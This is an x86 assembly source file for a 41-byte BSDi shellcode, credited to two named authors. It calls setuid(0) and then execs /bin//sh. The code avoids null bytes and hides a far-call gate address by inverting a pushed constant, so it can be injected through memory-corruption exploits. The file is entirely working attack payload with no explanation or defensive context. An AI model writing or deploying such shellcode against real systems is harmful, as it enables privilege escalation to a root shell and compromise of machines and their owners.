##
#
# arch    : ia32
# platform: BSDi
# purpose : setuid-execve
# size    : 41 bytes
# author  : skape (mmiller [at] hick.org)
#           optyx (optyx [at] uberhax0r.net)
#
##
.globl main

.equ NONULLS, 1

main:
	nop
__BEGIN__:
startup:
	push   $0x3cfff8ff
	notl   (%esp)
	xor    %eax, %eax
	cdq
	mov    $0x9a, %al
	push   %eax
	mov    %esp, %edi

setuid:
	push   %edx
	mov    $0x17, %al
	call   *%edi
execve:
	push   %edx
	push   $0x68732f2f
	push   $0x6e69622f
	mov    %esp, %ebx
	push   %edx
	push   %esp
	push   %ebx
	mov    $0x3b, %al
	call   *%edi

__END__:
	int3
